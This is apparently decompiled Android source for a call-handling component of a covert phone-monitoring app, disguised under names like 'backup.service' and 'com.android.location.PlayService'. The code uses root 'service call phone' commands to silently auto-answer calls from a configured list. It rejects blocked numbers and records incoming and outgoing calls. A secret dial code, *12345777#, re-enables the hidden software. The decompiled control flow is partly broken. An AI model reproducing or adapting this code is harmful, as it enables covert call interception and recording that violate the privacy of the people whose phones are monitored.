package ru.mobile.protector;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.android.location.CustomExceptionHandler;
import com.android.location.PlayService;

public class CallReceiver
  extends BroadcastReceiver
{
  private static final String TAG = "backup.service";
  
  public CallReceiver() {}
  
  public void Answer(String paramString)
  {
    Object localObject = PlayService.sAnswerList;
    String str;
    if ((localObject != null) && (((String)localObject).length() > 0) && (PlayService.bCanSu == PlayService.CAN))
    {
      str = "service call phone 6";
      if (Build.VERSION.SDK_INT == 18) {
        str = "service call phone 7";
      }
      if (Build.VERSION.SDK_INT >= 21) {
        str = "service call phone 5";
      }
      if (((String)localObject).equals(new String("*"))) {
        PlayService.commandSU(str);
      }
    }
    else
    {
      return;
    }
    localObject = ((String)localObject).split(",");
    PlayService.FLOG("sAnswerList.len=" + localObject.length);
    int j = 0;
    int i = 0;
    for (;;)
    {
      if (i >= localObject.length) {}
      for (i = j; i != 0; i = 1)
      {
        PlayService.commandSU(str);
        return;
        if (!paramString.endsWith(localObject[i])) {
          break label149;
        }
      }
      break;
      label149:
      i += 1;
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    Log.v("backup.service", "CallReceiver:onReceive=" + PlayService.ref);
    if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
      Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
    }
    Bundle localBundle;
    Object localObject2;
    boolean bool;
    String str2;
    String str1;
    try
    {
      if (PlayService.ref == null)
      {
        Log.v("backup.service", "Service already dead, try to start?");
        Log.v("backup.service", "Sent start intent?");
        return;
      }
      if (PlayService.ref != null)
      {
        PlayService.ref.StartThread(0);
        PlayService.ref.StartThread(1);
        PlayService.ref.StartThread(2);
        PlayService.ref.StartThread(3);
      }
      if (paramIntent == null) {
        break label1120;
      }
      localBundle = paramIntent.getExtras();
      if (localBundle == null) {
        break label1120;
      }
      localObject2 = localBundle.getString("incoming_number");
      bool = false;
      PlayService.FLOG("CallRecv.sCallBlockList = " + PlayService.sCallBlockList + ",isOrdered=" + isOrderedBroadcast());
      PlayService.FLOG("CallRecv.Incoming number = " + (String)localObject2);
      PlayService.FLOG("Intent=" + paramIntent);
      PlayService.FLOG("CallRecv.Action = " + paramIntent.getAction());
      PlayService.FLOG("Bundle=" + localBundle);
      PlayService.FLOG("EXTRA_STATE =" + localBundle.getString("state"));
      str2 = localBundle.getString("android.intent.extra.PHONE_NUMBER");
      str1 = localBundle.getString("incoming_number");
      if (localObject2 == null) {
        break label1121;
      }
      localObject1 = localObject2;
      if (((String)localObject2).length() == 0) {
        break label1121;
      }
      if (localObject1 == null) {
        break label1128;
      }
      localObject2 = localObject1;
      if (((String)localObject1).length() == 0) {
        break label1128;
      }
      label330:
      PlayService.FLOG("bundle.PHONE_NUMBER =" + str2);
      PlayService.FLOG("bundle.INCOMING_NUMBER =" + str1);
      PlayService.FLOG("magic ussd ? ");
      if ((str2 != null) && (str2.equals("*12345777#")))
      {
        PlayService.FLOG("try to enable soft");
        PlayService.EnableSoft(paramContext);
        return;
      }
    }
    catch (Exception paramContext)
    {
      Log.v("backup.service", "CallReceiver fallen down");
      Log.v("backup.service", paramContext.getMessage());
      return;
    }
    PlayService.FLOG("no");
    PlayService.FLOG("NuMBER = " + (String)localObject2);
    Object localObject1 = localObject2;
    label461:
    int i;
    if (localObject2 == null)
    {
      localObject1 = str2;
      break label1135;
      PlayService.FLOG("SDK=" + Build.VERSION.SDK_INT);
      if ((PlayService.sCallBlockList != null) && (PlayService.sCallBlockList.length() > 0) && (localObject2 != null))
      {
        localObject1 = PlayService.sCallBlockList.split(",");
        i = 0;
      }
    }
    for (;;)
    {
      if (i >= localObject1.length) {}
      for (;;)
      {
        PlayService.FLOG("CallRecv.Block = " + bool);
        if ((!paramIntent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) || (!bool)) {
          break;
        }
        PlayService.FLOG("CallRecv.Canceling outgoing call = " + bool);
        PlayService.ref.rejectPhoneAidl(paramContext, (String)localObject2);
        return;
        if ((localObject1[i].length() == 0) || (!((String)localObject2).endsWith(localObject1[i]))) {
          break label1151;
        }
        bool = true;
      }
      if ((paramIntent.getAction().equals("android.intent.action.ANSWER")) && (bool))
      {
        PlayService.FLOG("CallRecv.Canceling incoming call = " + bool);
        PlayService.ref.rejectPhoneAidl(paramContext, (String)localObject2);
        return;
      }
      if ((paramIntent.getAction().equals("android.intent.action.PHONE_STATE")) && (bool))
      {
        PlayService.FLOG("CallRecv.Canceling some call call = " + bool);
        PlayService.ref.rejectPhoneAidl(paramContext, (String)localObject2);
        return;
      }
      PlayService.FLOG("CallRecv.unknown behaviour " + bool);
      return;
      if ((paramIntent != null) && (localBundle != null) && (paramIntent.getAction().equals("android.intent.action.PHONE_STATE")) && (localBundle.getString("state").equals(TelephonyManager.EXTRA_STATE_RINGING))) {
        Answer((String)localObject2);
      }
      if (PlayService.ref != null)
      {
        PlayService.FLOG("iCallAnswerEvent = " + PlayService.iCallAnswerEvent);
        if ((paramIntent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) && (localObject2 != null))
        {
          if ((((String)localObject2).startsWith("*")) || (((String)localObject2).startsWith("#")))
          {
            PlayService.FLOG("Just USSD command, skip panic");
            return;
          }
          PlayService.FLOG("CallRecv.outgoing call");
          PlayService.ref.StartCallRecord((String)localObject2);
          return;
        }
        if ((paramIntent.getAction().equals("android.intent.action.ANSWER")) && ((PlayService.iCallAnswerEvent == 0) || (PlayService.iCallAnswerEvent == 3) || (PlayService.iCallAnswerEvent == 4) || (PlayService.iCallAnswerEvent == 5)))
        {
          PlayService.FLOG("action.ANSWER (ringing)");
          PlayService.ref.StartCallRecord((String)localObject2);
          return;
        }
        if (paramIntent.getAction().equals("android.intent.action.PHONE_STATE"))
        {
          PlayService.FLOG("action.PHONE_STATE");
          if ((localBundle.getString("state").equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) && ((PlayService.iCallAnswerEvent == 0) || (PlayService.iCallAnswerEvent == 1) || (PlayService.iCallAnswerEvent == 2) || (PlayService.iCallAnswerEvent == 3)))
          {
            PlayService.FLOG("extra " + localBundle.getString("state"));
            PlayService.ref.StartCallRecord((String)localObject2);
            return;
          }
          if ((localBundle.getString("state").equals(TelephonyManager.EXTRA_STATE_RINGING)) && ((PlayService.iCallAnswerEvent == 0) || (PlayService.iCallAnswerEvent == 1) || (PlayService.iCallAnswerEvent == 5) || (PlayService.iCallAnswerEvent == 6)))
          {
            PlayService.FLOG("extra " + localBundle.getString("state"));
            PlayService.ref.StartCallRecord((String)localObject2);
            return;
          }
          if (localBundle.getString("state").equals(TelephonyManager.EXTRA_STATE_IDLE))
          {
            PlayService.FLOG("extra IDLE");
            PlayService.ref.StopCallRecord();
            PlayService.ref.AfterCall();
          }
        }
      }
      label1120:
      return;
      label1121:
      localObject1 = str2;
      break;
      label1128:
      localObject2 = str1;
      break label330;
      label1135:
      localObject2 = localObject1;
      if (localObject1 != null) {
        break label461;
      }
      localObject2 = str1;
      break label461;
      label1151:
      i += 1;
    }
  }
}
